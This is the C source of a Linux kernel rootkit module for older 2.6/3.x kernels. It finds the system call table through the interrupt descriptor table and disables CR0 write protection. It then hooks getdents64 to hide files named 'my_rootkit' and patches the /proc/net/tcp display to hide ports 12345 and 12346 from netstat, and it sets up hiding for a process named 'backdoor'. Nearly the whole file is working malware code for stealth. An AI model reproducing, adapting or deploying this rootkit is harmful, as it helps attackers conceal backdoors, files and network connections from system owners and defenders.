#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/dirent.h> 
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/syscalls.h> 
//flags e.g. O_RDWR , O_EXCL
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
//get_ds() set_fs() get_fs()
//#include <asm/processor.h>
//#include <asm/uaccess.h>
//hide netstat
#include <net/tcp.h>
//#include <linux/proc_fs.h>
#include "my_rootkit.h"

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 0)
#define LINUX26
#endif
#ifdef LINUX26
/*code in 3.2 kernel*/
struct idt {
	unsigned short limit;
	unsigned long base;
}__attribute__((packed));

struct idt_descriptor {
	unsigned short off_low;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off_high;
} __attribute__((packed));

void **sys_call_table;

asmlinkage ssize_t (*original_read)(unsigned int, char *, size_t);

unsigned int original_mkdir;

void* get_system_call(void)
{
	struct idt idtr;
	struct idt_descriptor desc;
	
	asm ("sidt %0":"=m"(idtr));
	memcpy(&desc, (void*)(idtr.base+(0x80*8)), sizeof(desc));
	return ((void*)((desc.off_high<<16) | desc.off_low));
}
void* get_sys_call_table(void* system_call)
{
	unsigned char *p;
	unsigned long s_c_t;
	int count = 0;
	
	p = (unsigned char *)system_call;
	while (!((*p==0xff)&&(*(p+1)==0x14)&&(*(p+2)==0x85))) {
		p++;
		if (count++ > 100) {
			count = -1;
			break;
		}
	}
	if (count != -1) {
		p += 3;
		s_c_t = *((unsigned long*)p);
	}
	else s_c_t = 0;
	return ((void*)s_c_t);
}

void setback_cr0(unsigned int val)
{
    asm volatile("movl %%eax, %%cr0"
               :
               : "a"(val)
               );
}
 
unsigned int clear_cr0_save(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
	return ret;
}

asmlinkage long my_rootkit_mkdir(const char *name,int mod)
{
	printk(KERN_ALERT"mkdir call is intercepted\n");
	return 0;
}

asmlinkage ssize_t my_rootkit_read(int fd, char *buf, size_t count)
{
	ssize_t ret;
	static int i = 0;
	if (i == 0) {
		i = 1;
		my_rootkit_debug("This is in my read\n");
	}
	ret = (*original_read)(fd, buf, count);
	return ret;
}
//hide files and processes
static char *processname = "backdoor";
struct task_struct* get_task(pid_t pid)
{
    struct task_struct *p = get_current(),*entry=NULL;
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
        if(entry->pid == pid)
        {
            printk(KERN_DEBUG "pid found=%d\n",entry->pid);
            return entry;
        }
        else
        {
        	printk(KERN_DEBUG "pid=%d not found\n",pid);
        }
    }
    return NULL;
}
int myatoi(char *str)
{
    int res = 0, mul = 1;
    char *ptr = NULL;

    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9')
            return (-1);
        res += (*ptr - '0') * mul;
        mul *= 10;
    }
    if(res > 0 && res < 9999)
        printk(KERN_INFO "pid=%d,",res);
    printk("\n");
    return (res);
}
static char* get_name(struct task_struct *p, char *buf)
{
    int i;
    char *name = NULL;
	unsigned char c;

	if (NULL == p || NULL == buf) return NULL;
	my_rootkit_debug("task->comm:%s\n", p->comm);
    name = p->comm;
    i = sizeof(p->comm);
    do {
		c = *name;
        name++;  i--;
        *buf = c;
        if (!c) break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n')
        {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    } while (i);
    *buf = '\n';
    return buf + 1;
}
static int get_process(pid_t pid)
{
    struct task_struct *task = get_task(pid);
    char buffer[64] = "0";

    if (task)
    {
        get_name(task, buffer);
        if(pid>0 && pid<9999)
    	    my_rootkit_debug("task name=%s\n", buffer);
        if(strstr(buffer, processname)) return 1;
        else return 0;
    }
    else return 0;
}
static int is_hide(char *str)
{
	return 0;
}
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) 
{ 
	unsigned int bufLength, recordLength, modifyBufLength;
	struct linux_dirent64 *dirp2, *dirp3,
	*head = NULL, 				//进行修改时，指向正确的列表的头条记录
	*prev = NULL; 				//进行修改时，指向列表中上一项记录
	char hide_file[]="my_rootkit"; //要隐藏的文件名字
	
	bufLength = (*original_getdents64)(fd, dirp, count); //调用原本函数得到文件夹信息
	if (bufLength <= 0) return bufLength ; //如果函数调用出错，直接返回好了
	
	//申请内核空间
	dirp2 = (struct linux_dirent64 *)kmalloc(bufLength, GFP_KERNEL);
	if (!dirp2) return bufLength;
	
	//把已经得到的文件夹信息从用户空间复制出来
	if (copy_from_user(dirp2, dirp, bufLength))
	{
		return bufLength;
	}

	head = dirp2;
	dirp3 = dirp2;
	modifyBufLength = bufLength;
	while (((unsigned long)dirp3) < (((unsigned long)dirp2) + bufLength))
	{      
		recordLength = dirp3->d_reclen;
		if (recordLength == 0)
		{
			//有些文件系统getdents函数没能正确运行 
			break;
		}
		// 是否是我们要隐藏的文件 
		if (strncmp(dirp3->d_name, hide_file, strlen(hide_file)) == 0)
		{        
			if (!prev) //整个列表中的第一个记录就是我们要隐藏的文件
			{
				head = (struct linux_dirent64 *)((char *)dirp3 + recordLength);
				modifyBufLength -= recordLength;
			}
			else{ // 修改前一个记录长度，去掉我们要隐藏的文件纪录 
				prev->d_reclen += recordLength;
				memset(dirp3, 0, recordLength);
			}
		}
		else {
			prev = dirp3;
		}
		//继续下一条记录查找
		dirp3 = (struct linux_dirent64 *)((char*)dirp3 + recordLength);
	}

	// 用我们修改后的文件信息覆盖原有用户空间的文件信息 
	copy_to_user(dirp, head, modifyBufLength);
	kfree(dirp2);
	
	return modifyBufLength;
}

//hide netstat
#define MY_TMPSZ 150 //tcp_ipv4.c line 2497
typedef int(*TCP4_SEQ_SHOW)(struct seq_file*,void*);
TCP4_SEQ_SHOW orig_tcp4_seq_show = NULL;
static int g_hide_ports[] = {12345, 12346, 0};

static struct proc_dir_entry* find_proc_tcp(void)
{
	struct proc_dir_entry *p = NULL;
	if (NULL==init_net.proc_net || NULL==init_net.proc_net->subdir) {
		my_rootkit_debug("Failed to find tcp from /proc\n");
		return NULL;
	}
	p = init_net.proc_net->subdir;
	//my_rootkit_debug("/proc/net/%s\n", p->name);
	while (p && strcmp(p->name,"tcp")) {
		//my_rootkit_debug("/proc/net/%s\n", p->name);
		p = p->next;
	}
	return p;
}
char* strnstr(const char *src, const char *needle, size_t n)
{
	char *s = strstr(src, needle);
	if (NULL == s) return NULL;
	if (s-src+strlen(needle) <= n)
		return s;
	else return NULL;
}
int my_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int i = 0, r = 0;
	char port[12];
	char *s = NULL;

	r = orig_tcp4_seq_show(seq, v);
	for (i = 0; g_hide_ports[i]; i++) {
		sprintf(port, ":%04X", g_hide_ports[i]);
		//my_rootkit_debug("\n\n++++++++count=%d port=%s\n",seq->count,port);
		//my_rootkit_debug("========one msg:\n%s\n",seq->buf+seq->count-MY_TMPSZ);
		s = strnstr(seq->buf+seq->count-MY_TMPSZ, port, MY_TMPSZ);
		if (s) {
			//my_rootkit_debug("=========Find dist=%d\n",s-(seq->buf+seq->count-MY_TMPSZ));
			//my_rootkit_debug("buf:%s\n", seq->buf);
			seq->count -= MY_TMPSZ;
			break;
		}
		else {
			//my_rootkit_debug("=========Not Find\n");
			//my_rootkit_debug("buf:%s\n", seq->buf);
		}
	}

	return r;
}
static int hack_tcp4_seq_show(TCP4_SEQ_SHOW *old_func, TCP4_SEQ_SHOW new_func)
{
	struct proc_dir_entry *pde = NULL;
	struct tcp_seq_afinfo *t_afinfo = NULL;
	const char *err = "Failed to hack tcp4_seq_show!";

	//my_rootkit_debug("===Here is in hack_tcp4_seq_show\n");
	//my_rootkit_debug("init_net=%p\n", &init_net);
	
	pde = find_proc_tcp();
	if (NULL == pde) {
       my_rootkit_debug("%s pde is NULL\n", err);
	   return -1;
	}
	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
	if (NULL == t_afinfo) {
		my_rootkit_debug("%s t_afinfo is NULL\n", err);
		return -1;
	}
	if (NULL == t_afinfo->seq_ops.show) {
		my_rootkit_debug("%s orig_tcp4_seq_show is NULL\n", err);
		return -1;
	}
	if (NULL != old_func) {
		*old_func = t_afinfo->seq_ops.show;
	}
	if (NULL == new_func) {
		my_rootkit_debug("%s new tcp4_seq_show is NULL\n", err);
		return -1;
	}
	t_afinfo->seq_ops.show = new_func;
	return 0;
}
static int __init my_rootkit_init(void)
{
	void *system_call;
	unsigned int cr0;
	
	my_rootkit_debug("Begin in init_module\n");

	system_call = get_system_call();
	sys_call_table = (void**)get_sys_call_table(system_call);
	if (sys_call_table == 0) {
		my_rootkit_debug("Failed to get sys_call_table\n");
		return 0;
	}
 
	original_getdents64 = sys_call_table[__NR_getdents64];
	cr0 = clear_cr0_save();
	//hide net state
	hack_tcp4_seq_show(&orig_tcp4_seq_show, my_tcp4_seq_show);
	//
	sys_call_table[__NR_getdents64] = my_rootkit_getdents64;	
	setback_cr0(cr0);
	
	my_rootkit_debug("End in init_module\n");
	return 0;
}
//Exit the module
static void __exit my_rootkit_exit(void)
{
	unsigned int cr0;
	my_rootkit_debug("Begin in cleanup_module\n");

	cr0 = clear_cr0_save();
	if (orig_tcp4_seq_show)
		hack_tcp4_seq_show(NULL, orig_tcp4_seq_show);
	sys_call_table[__NR_getdents64] = original_getdents64;  
	setback_cr0(cr0);
	my_rootkit_debug("End in cleanup_module\n");
}
MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);
#else
/*code in 2.4 kernel */
#endif
